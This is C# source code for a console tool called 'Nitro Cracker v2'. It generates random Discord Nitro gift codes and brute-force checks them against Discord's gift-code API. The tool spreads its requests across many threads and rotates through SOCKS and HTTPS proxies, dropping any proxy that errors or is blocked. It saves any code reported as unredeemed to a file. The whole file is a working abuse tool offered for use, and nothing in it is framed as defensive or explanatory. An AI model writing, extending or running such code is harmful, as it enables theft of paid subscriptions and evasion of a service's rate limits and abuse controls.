using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Leaf.xNet;
namespace Nitro_Cracker_v2
{
    class Program
    {
        private static List<string> Codes = new List<string>();
        private static List<string> Proxies = new List<string>();
        private static List<long> Last_200_times = new List<long>();

        private static object _lock = new object();
        private static Random rnd = new Random();
        private static int CPM = 0;

        public static int Checked_C = 0;
        public static int Errors = 0;

        private static ProxyType proxytype;
        static void Main(string[] args)
        {
            while (true)
            {
                Menu();
            }

        }
        static void Menu()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\t  _   _ _ _                ____                _         \r\n\t | \\ | (_) |_ _ __ ___    / ___|_ __ __ _  ___| | ___ __ \r\n\t |  \\| | | __| '__/ _ \\  | |   | '__/ _` |/ __| |/ / '__|\r\n\t | |\\  | | |_| | | (_) | | |___| | | (_| | (__|   <| |   \r\n\t |_| \\_|_|\\__|_|  \\___/   \\____|_|  \\__,_|\\___|_|\\_\\_|   \r\n\t           By Sheepy and Technic   \r\n");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.White;

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[1] Generate Nitro Codes");
            Console.WriteLine("[2] Check Nitro Codes");
            Console.ForegroundColor = ConsoleColor.White;

            Console.Write("# ");

            int selection  = Convert.ToInt32(Console.ReadLine());


            if (selection == 1)
            {
                Console.Write("Enter amount of codes: ");

                int code_count = Convert.ToInt32(Console.ReadLine());

                List<string> generated_codes = Generate.generate(code_count);

                Console.Write("Save Codes as: ");

                string filename = Console.ReadLine();

                if (!filename.Contains(".txt"))
                    filename += ".txt";

                try
                {
                    using (TextWriter tw = new StreamWriter(filename))
                    {
                        foreach (String s in generated_codes)
                            tw.WriteLine(s);
                    }
                    Console.WriteLine("Codes saved as " + filename);
                }
                catch(Exception e)
                {
                    Console.WriteLine(e.Message);
                    Console.ReadLine();
                    return;
                }
                
                

            }
            else if (selection == 2)
            {
                Console.Write("Enter the file with the codes: ");
                string filename = Console.ReadLine();

                if (!filename.Contains(".txt"))
                    filename += ".txt";

                try
                {
                    foreach (string line in File.ReadLines(filename))
                    {
                        Codes.Add(line.Replace("\n", ""));
                    }
                }
                catch(Exception e)
                {
                    Console.WriteLine(e.Message);
                    Console.ReadLine();
                    return;
                }


                Console.Write("Enter thread count: ");
                int thread_count = Convert.ToInt32(Console.ReadLine());


                Console.Write("Enter the file with the Proxies: ");
                string proxyfile = Console.ReadLine();
                if (!proxyfile.Contains(".txt"))
                    proxyfile += ".txt";

                Console.Write("Enter proxy type (https/socks4/socks5): ");
                string proxyType = Console.ReadLine();

                if (proxyType.ToLower() == "https")
                {
                    proxytype = ProxyType.HTTP;
                }
                else if (proxyType.ToLower() == "socks4")
                {
                    proxytype = ProxyType.Socks4;
                }
                else
                {
                    proxytype = ProxyType.Socks5;

                }

                List<Thread> threads = new List<Thread>();

                int i = 0;

                Console.Write("Start at line : ");
                i = Convert.ToInt32(Console.ReadLine());

                var watch = System.Diagnostics.Stopwatch.StartNew();
                for (int l = 0; l < thread_count; l++)//SETTINGS
                {

                    Thread t = new Thread(delegate ()
                    {
                        while (i != Codes.Count() - 1)
                        {
                            string combo;

                            lock (_lock)
                            {
                                combo = Codes.ElementAt(i);
                                i++;
                            }
                            //Console.WriteLine("Checking " + combo);
                            
                            bool ok = false;

                            
                            while (!ok)
                            {
                                
                                if (Proxies.Count() < thread_count)
                                {
                                    Proxies = Load(proxyfile);
                                }

                                try
                                {
                                    string proxyaddy = Proxies.ElementAt(rnd.Next(0, Proxies.Count() - 1));
                                    ok = Checkcode(combo, proxyaddy);
                                }
                                catch (Exception e)
                                {
                                    //Console.WriteLine(e.Message);
                                }
                                Console.Title = "Nitro Cracker by Sheepy and Technic | Checked " + Checked_C + "/" + Codes.Count() + " CPM [" + CPM + "]";
                            }

                            long elapsedMs = watch.ElapsedMilliseconds;

                            //if (Last_200_times.Count() < 200)
                            //    Last_200_times.Add(elapsedMs);
                            //else
                            //{
                            //    Last_200_times.RemoveAt(0);
                            //    Last_200_times.Add(elapsedMs);

                            //}

                            CPM = (int)(Checked_C * 60000 / elapsedMs);

                            

                            if (Proxies.Count() < thread_count)
                            {
                                Proxies = Load(proxyfile);
                            }

                            try
                            {

                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.Message);
                            }
                            Console.Title = "Nitro Cracker by Sheepy and Technic | Checked " + Checked_C + "/" + Codes.Count() + " CPM [" + CPM + "]";


                        }
                    });
                    t.Start();
                    threads.Add(t);
                    Thread.Sleep(100);
                }
                foreach (Thread thread in threads.ToList())
                {

                    thread.Join();
                    threads.Remove(thread);
                }
            }

        }
        public static List<string> Load(string dir)
        {
            List<string> toLoad = new List<string>();

            foreach (string line in File.ReadLines(dir))
            {
                toLoad.Add(line.Replace("\n", ""));

            }
            return toLoad.Distinct().ToList();
        }
        public static void WriteCode(string code)
        {
            bool written = false;
            while (!written)
            {
                try
                {
                    StreamWriter sr = File.AppendText(@"./NitroCodes.txt");
                    sr.WriteLine(code);
                    sr.Close();
                    written = true;
                }
                catch
                {

                }

            }
        }
        private static bool Checkcode(string code, string proxyaddy)
        {

            try
            {
                using (var request = new HttpRequest())
                {

                    if (proxytype == ProxyType.Socks5)
                    {
                        request.Proxy = Socks5ProxyClient.Parse(proxyaddy);
                    }
                    else if (proxytype == ProxyType.Socks4)
                    {
                        request.Proxy = Socks4ProxyClient.Parse(proxyaddy);
                    }
                    else
                    {
                        request.Proxy = HttpProxyClient.Parse(proxyaddy);
                    }

                    string text = request.Get("https://discordapp.com/api/v6/entitlements/gift-codes/" + code).ToString();

                    if (text.Contains("\"redeemed\": false"))
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        
                        Console.WriteLine("[+] Found code -->  " + code);
                        WriteCode(code);
                    }
                    else
                    {

                    }
                    Checked_C++;

                }
                return true;
            }
            catch (HttpException ex)
            {
                if ((int)ex.HttpStatusCode == 404)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[-] Bad code : " + code);
                    Checked_C++;
                    return true;

                }
                else
                {
                    //Console.WriteLine(ex.Message + " by " + proxyaddy);
                    try
                    {
                        //Console.ForegroundColor = ConsoleColor.Gray;

                        Proxies.Remove(proxyaddy);
                        //Console.WriteLine("removed proxy " + proxyaddy);
                    }
                    catch (Exception x) { Console.WriteLine(x.Message); }
                    Errors++;
                    return false;
                }
            }

        }
    }
}
